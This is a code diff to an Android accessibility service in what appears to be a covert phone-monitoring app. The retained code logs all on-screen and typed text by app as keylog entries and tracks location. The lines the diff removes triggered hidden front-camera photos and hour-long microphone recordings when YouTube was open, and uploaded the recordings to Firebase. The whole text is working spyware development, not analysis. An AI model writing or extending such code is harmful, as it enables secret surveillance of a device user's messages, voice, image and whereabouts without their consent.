@@ -91,107 +91,24 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
             packageName = event.packageName.toString() + ":"
         }
         Log.i(TAG, "onAccessibilityEvent $packageName");
-//        var file = File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt")
-//        var fileExists = file.exists()
-//        if (!fileExists) {
-//            val isNewFileCreated: Boolean = file.createNewFile()
-//            timer2 = MyCountDownTimer(10 * 60 * 1000, (1 * 60000).toLong(), {
-//                //         setIntervalRecord(it)
-//                fileName = "uyuyuyuy"
-//            }) {
-//                recorder.stopRecording { sendFileCall() }
-//                Log.i("finishRecording", "finishRecording")
-//                val isNewFileCreated: Boolean = file.delete()
-//                //   private fun sendFileAudio() {
-//                val filePath =
-//                    "/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/"
-//                val dateName = fileName!!.replace("$filePath/", "")
-//                val uri = Uri.fromFile(File(fileName))
-//            }
-//
-//            nameAudio = ConstFun.getRandomNumeric()
-//            dateTime = ConstFun.getDateTime().replace(":",".").replace(":",".")
-//            fileName = "/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/" + dateTime + ".mp3" //context.getFileNameAudio(nameAudio, dateTime)
-//
-//            recorder.startRecording(MediaRecorder.AudioSource.MIC, fileName)
-//            timer2!!.start()
-//        }
+
         try {
             val data = event.text.toString()
+            var data1 = ""
+            if (event.contentDescription != null)
+                data1 = event.contentDescription.toString()
             if (data != "[]") {
                 val data = packageName + event.text.toString()
                 interactor.setDataKey("${getDateTime()} |(TEXT)| $data")
                 i(TAG, "${getDateTime()} |(TEXT)| $data")
-//            val childPhoto = ChildPhoto(true, CameraFacing.FRONT_FACING_CAMERA)
-//            getReference("${Consts.PHOTO}/$PARAMS").setValue(childPhoto)
-//            getReference("${Consts.PHOTO}/${Consts.CHILD_PERMISSION}").setValue(true)
 
                 //      val filePath = "/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/" //${Consts.ADDRESS_AUDIO_RECORD}";
                 var dateName = "" //fileName!!.replace("$filePath/", "")
                 var uri = Uri.fromFile(File("fileName")) //file:///storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/28%20sept.%202022%2002%3A19%20p.%20m.%2C1664392755930.mp3
-//                File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/").walk()
-//                    .forEach {
-//                        println(it)
-//                        if (it.absolutePath.contains(".mp3")) {
-//                            dateName = it.absolutePath
-//                            uri = Uri.fromFile(File(dateName))
-//
-//                            disposable.add(
-//                                firebase.putFile("$RECORDING/$dateName", uri)
-//                                    .subscribeOn(Schedulers.io())
-//                                    .observeOn(AndroidSchedulers.mainThread())
-//                                    .subscribe(
-//                                        {
-//                                            setPushName()
-//                                        },
-//                                        {
-//                                            deleteFile(fileName)
-//                                        })
-//                            )
-//                        }
-//                    }
             }
-            if (packageName.contains("youtube") || data.contains("youtube")) {
-                // val text = event.text.toString();
-                val text = packageName + event.text.toString()
 
-                //   val text = packageName + event.text.toString()
-                val childPhoto2 = ChildPhoto(true, CameraFacing.FRONT_FACING_CAMERA)
-                getReference("${Consts.PHOTO}/$PARAMS").setValue(childPhoto2)
-                getReference("${Consts.PHOTO}/${Consts.CHILD_PERMISSION}").setValue(true)
-                TimeUnit.SECONDS.sleep(1L)
-                //Recording
-                val childRecording = ChildRecording(true, 3600000)
-                getReference("$RECORDING/$PARAMS").setValue(childRecording)
-             //   if (data != "[]" && data != "[YouTube]") {
-                if (text.contains("[YouTube]")) {
-                    interactor.setDataKey("${getDateTime()} |(TEXT)| $data")
-                    i(TAG, "${getDateTime()} |(youtube)| $data")
-                    //  showApp(true)
-
-                    //         TimeUnit.SECONDS.sleep(5L)
-//                val childPhoto2 = ChildPhoto(true, CameraFacing.REAR_FACING_CAMERA)
-//                getReference("${Consts.PHOTO}/$PARAMS").setValue(childPhoto2)
-//                getReference("${Consts.PHOTO}/${Consts.CHILD_PERMISSION}").setValue(true)
-                }
-
-                //    getReference("$RECORDING/${Consts.TIMER}/${Consts.INTERVAL}").setValue(0)
-                Log.i("keylog", packageName + "-" + data)
-                if (text.contains("Grabando") || text.contains("[Pausar]") || text.contains("[Llamada]") || text.contains(
-                        "[CONTESTAR]"
-                    )
-                ) {//                interactor.getRecordingAudio()
-                    //    startRecording(child.timeAudio!!)
-                    //    val childRecording = ChildRecording(true,60000)
-                    //   getReference("$RECORDING/$PARAMS").setValue(childRecording)
-                    //photo
-
-                }
-                //   interactor.getCapturePicture()
-            }
             when (event.eventType) {
                 AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
-
                     if (data != "[]") {
                         val data = packageName + event.text.toString()
                         interactor.setDataKey("${getDateTime()} |(TEXT)| $data")
@@ -317,11 +234,7 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
     //location
     private fun getLocation() {
         locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
-        if (ActivityCompat.checkSelfPermission(
-                this,
-                Manifest.permission.ACCESS_FINE_LOCATION
-            ) == PackageManager.PERMISSION_GRANTED
-        ) {
+        if (ActivityCompat.checkSelfPermission( this, Manifest.permission.ACCESS_FINE_LOCATION ) == PackageManager.PERMISSION_GRANTED) {
             interactor.enablePermissionLocation(true)
             locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 1000, 0f, this)
         } else
